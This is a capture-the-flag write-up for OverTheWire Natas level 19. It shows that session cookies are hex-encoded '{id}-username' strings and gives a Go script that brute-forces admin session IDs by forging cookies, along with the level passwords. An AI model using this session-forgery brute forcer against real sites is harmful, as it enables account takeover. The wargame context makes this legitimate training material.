- - -
# 🚩 OverTheWire: Natas Wargame Solutions - Level 19
- Enter the username `aaaaaaaaaa` and the password `bbbbbbbbbb`
	- Cookie received: `...2d61616161616161616161`
- Enter username `bbbbbbbbbb` and password `aaaaaaaaaa`
	- Cookie received: `...2d62626262626262626262`
- Comparing the two cookies reveals that the suffix changes to match the hexadecimal
  representation of the username provided (`2d` corresponds to `-`, 61 to `a`, and 62 to `b`).

From this, the `PHPSESSID` format is deduced to be a sequential ID followed by the username, encoded in ASCII hex: `{id}-{username}`

Password for next Level: `p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`

**Solution**
To access the admin account, a valid session cookie must be forged. The target format is {id}-admin.
The solution involves:
    Constructing the payload string: `{id}-admin`.
    Encoding the string into hexadecimal to match the server's expected format (e.g., `123-admin` becomes `3132332d61646d696e`).
    Brute-forcing the {id} portion using a script, as the IDs are sequential and predictable.

A Golang script utilizing a worker pool was used to concurrently test IDs (1-999) until the password was returned.

code:
```golang
package main

import (
	"context"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
)

// Configuration
const (
	TargetURL   = "http://natas19.natas.labs.overthewire.org/index.php"
	Username    = "natas19"
	Password    = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" // Current level pass
	MaxWorkers  = 50                                 // Number of concurrent threads
	MaxSession  = 999                                // How many IDs to try
)

// Global client to reuse TCP connections (Keep-Alive)
var client = &http.Client{
	Timeout: 0, // No timeout for CTF, but in prod set this to 10s
}

func main() {
	// 1. Create a global context that we can cancel
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel() // Cleanup

	// 2. Create channels for jobs
	jobs := make(chan int, MaxSession)
	var wg sync.WaitGroup

	// 3. Start the Worker Pool
	fmt.Printf("[*] Starting %d workers...\n", MaxWorkers)
	for w := 0; w < MaxWorkers; w++ {
		wg.Add(1)
		go worker(ctx, &wg, jobs, cancel)
	}

	// 4. Send jobs to the channel
	go func() {
		for i := 1; i <= MaxSession; i++ {
			select {
			case <-ctx.Done():
				// Stop sending jobs if solution found
				close(jobs)
				return
			case jobs <- i:
			}
		}
		close(jobs)
	}()

	// 5. Wait for all workers to finish
	wg.Wait()
	fmt.Println("[*] Done.")
}

func worker(ctx context.Context, wg *sync.WaitGroup, jobs <-chan int, cancel context.CancelFunc) {
	defer wg.Done()

	for id := range jobs {
		// Check if we should stop (someone else found the flag)
		select {
		case <-ctx.Done():
			return
		default:
		}

		// Execute the attack
		if found, result := checkSession(ctx, id); found {
			fmt.Printf("\n[+] SUCCESS! Session ID: %d\n", id)
			fmt.Printf("[+] FLAG: %s\n", result)
			cancel() // This kills all other workers immediately!
			return
		}
		
		// Progress indicator
		if id%50 == 0 {
			fmt.Printf(".")
		}
	}
}

func checkSession(ctx context.Context, id int) (bool, string) {
	// Logic: Natas19 session is hex-encoded "number-admin"
	// e.g. "123-admin" -> hex encoded
	payload := fmt.Sprintf("%d-admin", id)
	encodedCookie := hex.EncodeToString([]byte(payload))

	// Create Request
	req, err := http.NewRequestWithContext(ctx, "GET", TargetURL, nil)
	if err != nil {
		return false, ""
	}

	// Set Headers
	req.SetBasicAuth(Username, Password)
	req.AddCookie(&http.Cookie{Name: "PHPSESSID", Value: encodedCookie})

	// Execute
	resp, err := client.Do(req)
	if err != nil {
		return false, "" // Ignore network errors in brute force
	}
	defer resp.Body.Close()

	// Read Body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, ""
	}

	bodyStr := string(body)

	// Check for victory
	if strings.Contains(bodyStr, "You are an admin") {
		// Extract password manually or with regex
		// Usually standard output implies the password is just displayed
		// Adjust parsing based on actual HTML response
		return true, parsePassword(bodyStr)
	}

	return false, ""
}

func parsePassword(html string) string {
	// Simple parser to grab the password from the HTML
	// Looking for "Password: <password>"
	// Note: Strings.Split is often faster than Regex for simple grabs
	if parts := strings.Split(html, "Password: "); len(parts) > 1 {
		if passParts := strings.Split(parts[1], "<"); len(passParts) > 0 {
			return passParts[0]
		}
	}
	return "Manual check required"
}
```